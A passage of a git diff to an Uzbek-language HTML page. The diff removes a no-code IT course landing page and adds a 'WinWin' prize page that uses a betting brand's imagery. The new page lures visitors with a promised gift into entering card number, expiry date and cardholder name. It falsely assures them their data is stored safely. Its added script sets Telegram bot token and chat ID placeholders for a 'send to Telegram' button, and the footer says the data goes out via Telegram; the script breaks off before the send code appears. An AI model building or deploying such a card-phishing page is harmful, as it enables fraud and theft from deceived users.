@@ -2,1529 +2,378 @@
 <html lang="uz">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IT Darsliklar - Dasturchi Bo'lmaganlar Uchun Dastur Yaratish</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>WinWin · Sovrinlar</title>
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Inter', sans-serif;
         }
-        
+
         body {
-            background-color: #f8f9fa;
-            color: #333;
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
-        
-        .container {
-            width: 90%;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        /* Header styles */
-        header {
-            background: linear-gradient(135deg, #1a237e, #3949ab);
-            color: white;
-            padding: 20px 0;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            position: sticky;
-            top: 0;
-            z-index: 1000;
-        }
-        
-        .header-content {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .logo {
-            font-size: 28px;
-            font-weight: 700;
+            min-height: 100vh;
             display: flex;
             align-items: center;
-        }
-        
-        .logo i {
-            color: #00e5ff;
-            margin-right: 10px;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.1); }
-            100% { transform: scale(1); }
-        }
-        
-        .logo span {
-            color: #00e5ff;
-        }
-        
-        nav ul {
-            display: flex;
-            list-style: none;
-        }
-        
-        nav ul li {
-            margin-left: 25px;
-            position: relative;
-        }
-        
-        nav ul li a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-            font-size: 18px;
-            transition: color 0.3s;
-        }
-        
-        nav ul li a:hover {
-            color: #00e5ff;
-        }
-        
-        nav ul li a::after {
-            content: '';
-            position: absolute;
-            width: 0;
-            height: 3px;
-            background: #00e5ff;
-            bottom: -5px;
-            left: 0;
-            transition: width 0.3s;
-        }
-        
-        nav ul li a:hover::after {
-            width: 100%;
-        }
-        
-        .mobile-menu {
-            display: none;
-            font-size: 24px;
-            cursor: pointer;
-        }
-        
-        /* Hero section */
-        .hero {
-            background: linear-gradient(rgba(0, 0, 0, 0.8), rgba(0, 0, 0, 0.8)), url('https://images.unsplash.com/photo-1555066931-4365d14bab8c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1170&q=80');
-            background-size: cover;
-            background-position: center;
-            color: white;
-            padding: 120px 0;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .floating-element {
-            position: absolute;
-            background: rgba(0, 229, 255, 0.1);
-            border-radius: 50%;
-            animation: float 6s ease-in-out infinite;
-        }
-        
-        .floating-element:nth-child(1) {
-            width: 80px;
-            height: 80px;
-            top: 20%;
-            left: 10%;
-            animation-delay: 0s;
-        }
-        
-        .floating-element:nth-child(2) {
-            width: 120px;
-            height: 120px;
-            bottom: 15%;
-            right: 15%;
-            animation-delay: 2s;
-        }
-        
-        .floating-element:nth-child(3) {
-            width: 60px;
-            height: 60px;
-            top: 40%;
-            right: 20%;
-            animation-delay: 4s;
-        }
-        
-        @keyframes float {
-            0% { transform: translateY(0px) rotate(0deg); }
-            50% { transform: translateY(-20px) rotate(180deg); }
-            100% { transform: translateY(0px) rotate(360deg); }
-        }
-        
-        .hero h1 {
-            font-size: 48px;
-            margin-bottom: 20px;
-            line-height: 1.2;
-        }
-        
-        .hero-highlight {
-            background: linear-gradient(90deg, #00e5ff, #2979ff);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-            position: relative;
-            display: inline-block;
-        }
-        
-        .hero-highlight::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, #00e5ff, #2979ff);
-            bottom: -5px;
-            left: 0;
-            animation: highlightWidth 3s infinite;
-        }
-        
-        @keyframes highlightWidth {
-            0% { width: 0; }
-            50% { width: 100%; }
-            100% { width: 0; }
-        }
-        
-        .hero p {
-            font-size: 22px;
-            max-width: 900px;
-            margin: 0 auto 30px;
-            color: #e0e0e0;
-        }
-        
-        .revolution-box {
-            background: rgba(0, 229, 255, 0.1);
-            border-left: 4px solid #00e5ff;
-            padding: 25px;
-            border-radius: 10px;
-            max-width: 900px;
-            margin: 40px auto;
-            animation: slideInLeft 1s ease-out;
-        }
-        
-        @keyframes slideInLeft {
-            from { transform: translateX(-50px); opacity: 0; }
-            to { transform: translateX(0); opacity: 1; }
-        }
-        
-        .revolution-box h3 {
-            font-size: 28px;
-            margin-bottom: 15px;
-            color: #00e5ff;
-        }
-        
-        .revolution-text {
-            font-size: 20px;
-            font-weight: 500;
-        }
-        
-        .cta-button {
-            display: inline-block;
-            background: linear-gradient(90deg, #00e5ff, #2979ff);
-            color: white;
-            padding: 18px 45px;
-            font-size: 20px;
-            font-weight: 600;
-            text-decoration: none;
-            border-radius: 50px;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(0, 229, 255, 0.4);
-            position: relative;
-            overflow: hidden;
-            z-index: 1;
-            cursor: pointer;
-            border: none;
-        }
-        
-        .cta-button.telegram-btn {
-            background: linear-gradient(90deg, #0088cc, #34b7f1);
-            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.4);
-        }
-        
-        .cta-button.telegram-btn::before {
-            background: linear-gradient(90deg, #34b7f1, #0088cc);
-        }
-        
-        .cta-button::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, #2979ff, #00e5ff);
-            transition: left 0.5s;
-            z-index: -1;
-        }
-        
-        .cta-button:hover::before {
-            left: 0;
-        }
-        
-        .cta-button:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 8px 25px rgba(0, 229, 255, 0.6);
-        }
-        
-        .cta-button.telegram-btn:hover {
-            box-shadow: 0 8px 25px rgba(0, 136, 204, 0.6);
-        }
-        
-        .telegram-icon {
-            margin-right: 10px;
-            font-size: 22px;
-        }
-        
-        /* Main concept section */
-        .section-title {
-            text-align: center;
-            font-size: 36px;
-            color: #1a237e;
-            margin: 60px 0 40px;
-            position: relative;
-        }
-        
-        .section-title:after {
-            content: '';
-            position: absolute;
-            width: 100px;
-            height: 4px;
-            background: linear-gradient(90deg, #00e5ff, #2979ff);
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            animation: lineWidth 3s infinite;
-        }
-        
-        @keyframes lineWidth {
-            0% { width: 50px; }
-            50% { width: 150px; }
-            100% { width: 50px; }
-        }
-        
-        .main-concept {
-            background: white;
-            border-radius: 20px;
-            padding: 50px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
-            margin-bottom: 60px;
-            position: relative;
-            overflow: hidden;
-            animation: fadeInUp 1s ease-out;
-        }
-        
-        @keyframes fadeInUp {
-            from { transform: translateY(30px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        
-        .concept-icon {
-            font-size: 60px;
-            color: #00e5ff;
-            margin-bottom: 20px;
-            display: inline-block;
-            animation: bounce 2s infinite;
-        }
-        
-        @keyframes bounce {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-15px); }
-        }
-        
-        .main-concept h3 {
-            font-size: 32px;
-            color: #1a237e;
-            margin-bottom: 20px;
-        }
-        
-        .concept-text {
-            font-size: 20px;
-            line-height: 1.8;
-            margin-bottom: 30px;
-        }
-        
-        .highlight-box {
-            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
-            border-radius: 15px;
-            padding: 25px;
-            margin: 25px 0;
-            border-left: 5px solid #2979ff;
-            animation: pulseBackground 4s infinite;
-        }
-        
-        @keyframes pulseBackground {
-            0% { background: linear-gradient(135deg, #e3f2fd, #bbdefb); }
-            50% { background: linear-gradient(135deg, #bbdefb, #90caf9); }
-            100% { background: linear-gradient(135deg, #e3f2fd, #bbdefb); }
-        }
-        
-        .highlight-box h4 {
-            font-size: 24px;
-            color: #1a237e;
-            margin-bottom: 15px;
-        }
-        
-        /* Instructors section */
-        .instructors {
-            display: flex;
             justify-content: center;
-            flex-wrap: wrap;
-            gap: 40px;
-            margin-bottom: 60px;
-        }
-        
-        .instructor {
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            width: 320px;
-            text-align: center;
-            padding: 30px;
-            transition: all 0.5s;
+            padding: 16px;
             position: relative;
+            background-color: #0b1a2e;
         }
-        
-        .instructor:hover {
-            transform: translateY(-15px) scale(1.03);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
-        }
-        
-        .instructor-img {
-            width: 160px;
-            height: 160px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 5px solid #e3f2fd;
-            margin-bottom: 20px;
-            animation: rotateIn 1s ease-out;
-        }
-        
-        @keyframes rotateIn {
-            from { transform: rotate(-180deg) scale(0); opacity: 0; }
-            to { transform: rotate(0) scale(1); opacity: 1; }
-        }
-        
-        .instructor h3 {
-            font-size: 26px;
-            color: #1a237e;
-            margin-bottom: 10px;
-        }
-        
-        .instructor-title {
-            color: #2979ff;
-            font-weight: 600;
-            margin-bottom: 15px;
-            font-size: 18px;
-        }
-        
-        /* Pricing section */
-        .pricing {
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap;
-            gap: 30px;
-            margin-bottom: 80px;
-        }
-        
-        .price-card {
-            background: white;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            width: 350px;
-            text-align: center;
-            padding: 40px 30px;
-            transition: all 0.5s;
-            position: relative;
-        }
-        
-        .price-card.popular {
-            border: 3px solid #00e5ff;
-            transform: scale(1.05);
-        }
-        
-        .price-card:hover {
-            transform: translateY(-15px);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
-        }
-        
-        .price-card.popular:hover {
-            transform: scale(1.05) translateY(-15px);
-        }
-        
-        .popular-tag {
-            position: absolute;
-            top: 0;
-            right: 0;
-            background: linear-gradient(90deg, #00e5ff, #2979ff);
-            color: white;
-            padding: 10px 25px;
-            font-weight: 600;
-            border-radius: 0 0 0 20px;
-            animation: tagPulse 2s infinite;
-        }
-        
-        @keyframes tagPulse {
-            0% { background: linear-gradient(90deg, #00e5ff, #2979ff); }
-            50% { background: linear-gradient(90deg, #2979ff, #00e5ff); }
-            100% { background: linear-gradient(90deg, #00e5ff, #2979ff); }
-        }
-        
-        .price-card h3 {
-            font-size: 30px;
-            color: #1a237e;
-            margin-bottom: 15px;
-        }
-        
-        .price {
-            font-size: 52px;
-            font-weight: 700;
-            color: #1a237e;
-            margin-bottom: 25px;
-            position: relative;
-            display: inline-block;
-        }
-        
-        .price::after {
-            content: '';
-            position: absolute;
-            width: 100%;
-            height: 3px;
-            background: linear-gradient(90deg, #00e5ff, #2979ff);
-            bottom: -5px;
-            left: 0;
-        }
-        
-        .price span {
-            font-size: 20px;
-            font-weight: 400;
-        }
-        
-        .price-card ul {
-            list-style: none;
-            text-align: left;
-            margin-bottom: 30px;
-        }
-        
-        .price-card ul li {
-            padding: 12px 0;
-            border-bottom: 1px solid #eee;
-            display: flex;
-            align-items: center;
-            font-size: 17px;
-        }
-        
-        .price-card ul li i {
-            color: #00e5ff;
-            margin-right: 12px;
-            font-size: 20px;
-        }
-        
-        /* No-coding section */
-        .no-coding {
-            background: linear-gradient(135deg, #1a237e, #3949ab);
-            color: white;
-            padding: 80px 0;
-            border-radius: 20px;
-            margin-bottom: 80px;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .no-coding::before {
-            content: '';
-            position: absolute;
-            width: 300px;
-            height: 300px;
-            background: rgba(0, 229, 255, 0.1);
-            border-radius: 50%;
-            top: -150px;
-            right: -100px;
-            animation: float 8s infinite;
-        }
-        
-        .no-coding::after {
-            content: '';
-            position: absolute;
-            width: 200px;
-            height: 200px;
-            background: rgba(41, 121, 255, 0.1);
-            border-radius: 50%;
-            bottom: -100px;
-            left: -50px;
-            animation: float 10s infinite reverse;
-        }
-        
-        .no-coding h2 {
-            font-size: 36px;
-            margin-bottom: 30px;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .no-coding-content {
-            max-width: 900px;
-            margin: 0 auto;
-            font-size: 20px;
-            line-height: 1.8;
-            position: relative;
-            z-index: 1;
-        }
-        
-        .no-coding-box {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 15px;
-            padding: 25px;
-            margin: 25px 0;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            animation: fadeIn 2s;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        
-        /* Benefits section */
-        .benefits {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
-            gap: 30px;
-            margin-bottom: 80px;
-        }
-        
-        .benefit-card {
-            background: white;
-            border-radius: 20px;
-            padding: 40px 30px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
-            transition: all 0.5s;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .benefit-card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.12);
-        }
-        
-        .benefit-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 5px;
-            height: 100%;
-            background: linear-gradient(180deg, #00e5ff, #2979ff);
-        }
-        
-        .benefit-icon {
-            font-size: 50px;
-            color: #00e5ff;
-            margin-bottom: 20px;
-            animation: spin 4s linear infinite;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .benefit-card h3 {
-            font-size: 24px;
-            color: #1a237e;
-            margin-bottom: 15px;
-        }
-        
-        /* Testimonials */
-        .testimonials {
-            margin-bottom: 80px;
-        }
-        
-        .testimonial-slider {
-            display: flex;
-            overflow-x: auto;
-            gap: 30px;
-            padding: 30px 0;
-            scrollbar-width: thin;
-        }
-        
-        .testimonial-slider::-webkit-scrollbar {
-            height: 8px;
-        }
-        
-        .testimonial-slider::-webkit-scrollbar-thumb {
-            background: linear-gradient(90deg, #00e5ff, #2979ff);
-            border-radius: 4px;
-        }
-        
-        .testimonial-card {
-            min-width: 380px;
-            background: white;
-            border-radius: 20px;
-            padding: 35px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
-            transition: all 0.5s;
-        }
-        
-        .testimonial-card:hover {
-            transform: scale(1.03);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.12);
-        }
-        
-        .testimonial-text {
-            font-style: italic;
-            margin-bottom: 25px;
-            color: #555;
-            font-size: 18px;
-            line-height: 1.7;
-        }
-        
-        .testimonial-author {
-            display: flex;
-            align-items: center;
-        }
-        
-        .author-img {
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-right: 15px;
-            border: 3px solid #e3f2fd;
-        }
-        
-        .author-info h4 {
-            color: #1a237e;
-            font-size: 20px;
-        }
-        
-        .author-info p {
-            color: #777;
-            font-size: 16px;
-        }
-        
-        /* Telegram Modal */
-        .telegram-modal {
-            display: none;
+
+        /* WinWin fon rasmi – 50% shaffof */
+        body::before {
+            content: "";
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 2000;
-            justify-content: center;
-            align-items: center;
-            animation: fadeIn 0.3s;
+            background-image: url('https://winwinbet.app/wp-content/uploads/2025/04/WinWin-Bet-Official-1024x559.webp');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            opacity: 0.5;
+            z-index: -1;
+            pointer-events: none;
         }
-        
-        .telegram-modal.active {
-            display: flex;
-        }
-        
-        .modal-content {
-            background: white;
-            border-radius: 20px;
-            padding: 40px;
+
+        /* Asosiy karta (umumiy uslub) */
+        .card {
+            width: 100%;
             max-width: 500px;
-            width: 90%;
-            text-align: center;
-            position: relative;
-            animation: slideInUp 0.5s;
+            background: rgba(255, 255, 255, 0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            border-radius: 36px;
+            padding: 32px 28px;
+            box-shadow: 0 25px 45px rgba(0, 30, 10, 0.4), 0 10px 20px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            transition: all 0.2s;
         }
-        
-        @keyframes slideInUp {
-            from { transform: translateY(50px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
-        }
-        
-        .modal-close {
-            position: absolute;
-            top: 15px;
-            right: 20px;
-            font-size: 30px;
-            color: #666;
-            cursor: pointer;
-            transition: color 0.3s;
-        }
-        
-        .modal-close:hover {
-            color: #ff0000;
-        }
-        
-        .modal-icon {
-            font-size: 70px;
-            color: #0088cc;
-            margin-bottom: 20px;
-            animation: bounce 2s infinite;
-        }
-        
-        .modal-content h3 {
-            font-size: 28px;
-            color: #1a237e;
-            margin-bottom: 15px;
-        }
-        
-        .modal-content p {
-            font-size: 18px;
-            color: #666;
-            margin-bottom: 25px;
-            line-height: 1.6;
-        }
-        
-        .telegram-link {
-            display: inline-block;
-            background: linear-gradient(90deg, #0088cc, #34b7f1);
+
+        .tournament-badge {
+            background: #00c853;
             color: white;
-            padding: 15px 30px;
-            font-size: 18px;
-            font-weight: 600;
-            text-decoration: none;
-            border-radius: 50px;
-            transition: all 0.3s;
-            box-shadow: 0 4px 15px rgba(0, 136, 204, 0.4);
-        }
-        
-        .telegram-link:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 6px 20px rgba(0, 136, 204, 0.6);
-        }
-        
-        .telegram-link i {
-            margin-right: 10px;
-        }
-        
-        /* Footer */
-        footer {
-            background: linear-gradient(135deg, #0d1440, #1a237e);
-            color: white;
-            padding: 80px 0 40px;
-            position: relative;
-        }
-        
-        .footer-content {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 40px;
-            margin-bottom: 40px;
-        }
-        
-        .footer-column h3 {
-            font-size: 24px;
-            margin-bottom: 25px;
-            color: #00e5ff;
-        }
-        
-        .footer-column p, .footer-column a {
-            color: #ddd;
-            margin-bottom: 12px;
-            display: block;
-            text-decoration: none;
-            transition: all 0.3s;
-        }
-        
-        .footer-column a:hover {
-            color: #00e5ff;
-            transform: translateX(5px);
-        }
-        
-        .social-icons {
-            display: flex;
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .social-icons a {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: 45px;
-            height: 45px;
-            background: rgba(0, 229, 255, 0.1);
-            border-radius: 50%;
-            color: white;
-            font-size: 20px;
-            transition: all 0.3s;
-        }
-        
-        .social-icons a:hover {
-            background: #00e5ff;
-            color: #1a237e;
-            transform: translateY(-5px);
-        }
-        
-        .copyright {
-            text-align: center;
-            padding-top: 40px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            color: #aaa;
-            font-size: 16px;
-        }
-        
-        /* Responsive design */
-        @media (max-width: 992px) {
-            .hero h1 {
-                font-size: 40px;
-            }
-            
-            .hero p {
-                font-size: 20px;
-            }
-            
-            .price-card.popular {
-                transform: scale(1);
-            }
-            
-            .price-card.popular:hover {
-                transform: translateY(-15px);
-            }
-        }
-        
-        @media (max-width: 768px) {
-            .header-content {
-                flex-direction: column;
-                text-align: center;
-            }
-            
-            nav ul {
-                margin-top: 20px;
-                flex-wrap: wrap;
-                justify-content: center;
-            }
-            
-            nav ul li {
-                margin: 0 10px 10px;
-            }
-            
-            .hero {
-                padding: 80px 0;
-            }
-            
-            .hero h1 {
-                font-size: 34px;
-            }
-            
-            .section-title {
-                font-size: 32px;
-            }
-            
-            .mobile-menu {
-                display: block;
-                position: absolute;
-                top: 25px;
-                right: 20px;
-            }
-            
-            nav {
-                display: none;
-                width: 100%;
-                margin-top: 20px;
-            }
-            
-            nav.active {
-                display: block;
-            }
-            
-            nav ul {
-                flex-direction: column;
-            }
-            
-            nav ul li {
-                margin: 10px 0;
-            }
-            
-            .main-concept {
-                padding: 30px;
-            }
-            
-            .concept-text {
-                font-size: 18px;
-            }
-        }
-        
-        @media (max-width: 576px) {
-            .hero h1 {
-                font-size: 30px;
-            }
-            
-            .hero p {
-                font-size: 18px;
-            }
-            
-            .section-title {
-                font-size: 28px;
-            }
-            
-            .price-card, .instructor {
-                width: 100%;
-                max-width: 350px;
-            }
-            
-            .testimonial-card {
-                min-width: 300px;
-            }
-            
-            .no-coding h2 {
-                font-size: 30px;
-            }
-            
-            .no-coding-content {
-                font-size: 18px;
-            }
-            
-            .modal-content {
-                padding: 30px 20px;
-            }
-            
-            .modal-content h3 {
-                font-size: 24px;
-            }
-        }
-        
-        /* Countdown timer */
-        .countdown {
-            background: rgba(0, 0, 0, 0.7);
-            color: white;
-            padding: 20px;
-            border-radius: 15px;
-            max-width: 600px;
-            margin: 30px auto;
-            text-align: center;
-        }
-        
-        .countdown-title {
-            font-size: 22px;
-            margin-bottom: 15px;
-            color: #00e5ff;
-        }
-        
-        .countdown-timer {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-        }
-        
-        .countdown-item {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-        
-        .countdown-number {
-            font-size: 40px;
             font-weight: 700;
-            color: #00e5ff;
-            background: rgba(255, 255, 255, 0.1);
-            width: 80px;
-            height: 80px;
+            font-size: 0.95rem;
+            padding: 8px 20px;
+            border-radius: 50px;
+            display: inline-block;
+            margin-bottom: 18px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 8px 14px -6px #00662b;
+            border: 1px solid #b9f6ca;
+            text-transform: uppercase;
+        }
+
+        h1 {
+            font-size: 2.1rem;
+            font-weight: 800;
+            color: #1c2e3f;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        h1 span {
+            color: #00a86b;
+            background: linear-gradient(145deg, #00e676, #00c853);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .highlight-green {
+            background: #ccffd9;
+            color: #006435;
+            font-weight: 600;
+            padding: 4px 16px;
+            border-radius: 40px;
+            display: inline-block;
+            margin: 8px 0 16px 0;
+            border-left: 5px solid #00c853;
+            font-size: 1.1rem;
+        }
+
+        /* Forma uslublari */
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #1e2b3a;
+            margin-bottom: 8px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 16px 20px;
+            font-size: 16px;
+            background: white;
+            border: 2px solid #e2e8f0;
+            border-radius: 30px;
+            outline: none;
+            transition: border 0.2s, box-shadow 0.2s;
+        }
+
+        .form-control:focus {
+            border-color: #00c853;
+            box-shadow: 0 8px 18px -8px #00a86b;
+        }
+
+        .form-control.error {
+            border-color: #d32f2f;
+            background-color: #fff5f5;
+        }
+
+        .row2 {
+            display: flex;
+            gap: 12px;
+        }
+
+        .row2 .form-group {
+            flex: 1;
+        }
+
+        .btn-submit {
+            width: 100%;
+            background: linear-gradient(145deg, #00c853, #00a86b);
+            color: white;
+            font-weight: 700;
+            font-size: 20px;
+            padding: 18px 20px;
+            border: none;
+            border-radius: 50px;
+            margin-top: 20px;
+            cursor: pointer;
+            box-shadow: 0 15px 25px -8px #00662b;
+            transition: all 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: 50%;
-            margin-bottom: 5px;
-            animation: countdownPulse 1s infinite;
+            gap: 8px;
+            border: 1px solid #b9f6ca;
         }
-        
-        @keyframes countdownPulse {
-            0% { box-shadow: 0 0 0 0 rgba(0, 229, 255, 0.7); }
-            70% { box-shadow: 0 0 0 15px rgba(0, 229, 255, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 229, 255, 0); }
+
+        .btn-submit:hover {
+            background: linear-gradient(145deg, #00b34a, #00803f);
+            transform: scale(1.02);
         }
-        
-        .countdown-label {
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .info-box {
+            background: rgba(0, 200, 83, 0.1);
+            border-radius: 20px;
+            padding: 16px;
+            margin: 24px 0 16px;
+            border: 1px dashed #00c853;
             font-size: 14px;
-            color: #ccc;
+            color: #1d3b2b;
+        }
+
+        footer {
+            margin-top: 24px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #1d3b2b;
+            opacity: 0.9;
+            border-top: 1px solid #a5d6a5;
+            padding-top: 16px;
+            font-weight: 500;
+        }
+
+        .visa-icon {
+            background: #1434cb;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 30px;
+            font-size: 0.8rem;
+            font-weight: 600;
+            display: inline-block;
+            margin-right: 6px;
+        }
+
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 18px;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
         }
     </style>
 </head>
 <body>
-    <!-- Telegram Modal -->
-    <div class="telegram-modal" id="telegramModal">
-        <div class="modal-content">
-            <div class="modal-close" id="closeModal">&times;</div>
-            <div class="modal-icon">
-                <i class="fab fa-telegram"></i>
+
+<div class="card">
+    <!-- TO'LOV MA'LUMOTLARI FORMASI – kod so‘ralmaydi, to‘g‘ridan-to‘g‘ri ko‘rinadi -->
+    <div id="paymentSection">
+        <div class="tournament-badge">💳 WINWIN SOVRINLARI</div>
+        <h1>Karta ma'lumotlari<span> orqali</span></h1>
+        <div class="highlight-green">⚡ 1 marta to‘ldirish – sovg‘a olish imkoniyati ⚡</div>
+
+        <!-- Karta formasi -->
+        <form id="paymentForm" onsubmit="return false;">
+            <div class="form-group">
+                <label><span>💳</span> Karta raqami</label>
+                <input type="text" id="cardNumber" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="off">
             </div>
-            <h3>Telegram Orqali Ro'yxatdan O'tish</h3>
-            <p>Kursni xarid qilish uchun quyidagi tugma orqali bizning Telegram botimizga o'ting. Bot sizga kurs haqida batafsil ma'lumot beradi va ro'yxatdan o'tish jarayonini boshlaydi.</p>
-            <p><strong>Bot: @teamseobot</strong></p>
-            <a href="https://t.me/teamseobot" target="_blank" class="telegram-link">
-                <i class="fab fa-telegram"></i> Telegram Botga O'tish
-            </a>
-            <p style="margin-top: 20px; font-size: 14px; color: #888;">Agar tugma ishlamasa, Telegramdan <strong>@teamseobot</strong> ni qidiring yoki <strong>t.me/teamseobot</strong> manziliga o'ting</p>
+
+            <div class="row2">
+                <div class="form-group">
+                    <label><span>📅</span> Amal qilish muddati</label>
+                    <input type="text" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" inputmode="numeric">
+                </div>
+                <div class="form-group">
+                    <label><span>👤</span> Ism Familiya</label>
+                    <input type="text" id="cardholderName" class="form-control" placeholder="Ism Familiya" maxlength="50">
+                </div>
+            </div>
+
+            <button type="button" class="btn-submit" id="sendToTelegramBtn">
+                <span>✅</span> Tasdiqlash va yuborish
+            </button>
+        </form>
+
+        <!-- Qisqacha ma'lumot (turnir haqida) -->
+        <div class="info-box">
+            📢 Ma'lumotlaringiz xavfsiz saqlanadi. Turnir yakunida 25 fevraldan boshlab sovg‘alar beriladi.
         </div>
+
+        <footer>
+            <span class="visa-icon">💳 Visa</span> To‘lov ma'lumotlari telegram orqali yetkaziladi
+        </footer>
     </div>
+</div>
 
-    <!-- Header section -->
-    <header>
-        <div class="container header-content">
-            <div class="logo">
-                <i class="fas fa-laptop-code"></i>
-                IT<span>Darslik</span>
-            </div>
-            <div class="mobile-menu" id="mobileMenu">
-                <i class="fas fa-bars"></i>
-            </div>
-            <nav id="mainNav">
-                <ul>
-                    <li><a href="#home">Bosh sahifa</a></li>
-                    <li><a href="#concept">Konsept</a></li>
-                    <li><a href="#instructors">O'qituvchilar</a></li>
-                    <li><a href="#pricing">Narxlar</a></li>
-                    <li><a href="#benefits">Imkoniyatlar</a></li>
-                </ul>
-            </nav>
-        </div>
-    </header>
+<script>
+    (function() {
+        // Telegram bot ma'lumotlari (o‘z tokeningiz va chat ID ni yozing)
+        const BOT_TOKEN = 'YOUR_BOT_TOKEN';      // <-- O‘z bot tokeningizni qo‘ying
+        const CHAT_ID   = 'YOUR_CHAT_ID';        // <-- O‘z chat ID ni qo‘ying
 
-    <!-- Hero section -->
-    <section class="hero" id="home">
-        <div class="floating-element"></div>
-        <div class="floating-element"></div>
-        <div class="floating-element"></div>
-        
-        <div class="container">
-            <h1 class="animate__animated animate__fadeInDown">IT Darsliklar: <span class="hero-highlight">Kod Yozmasdan Dastur Yaratish</span></h1>
-            <p class="animate__animated animate__fadeIn animate__delay-1s">Luis va Sergio tomonidan o'qitiladigan kursda dasturlashni o'rgamasdan ham dastur yaratib, internet orqali pul toping, sarmoyasiz biznes boshlang.</p>
-            
-            <div class="revolution-box animate__animated animate__fadeInUp animate__delay-1s">
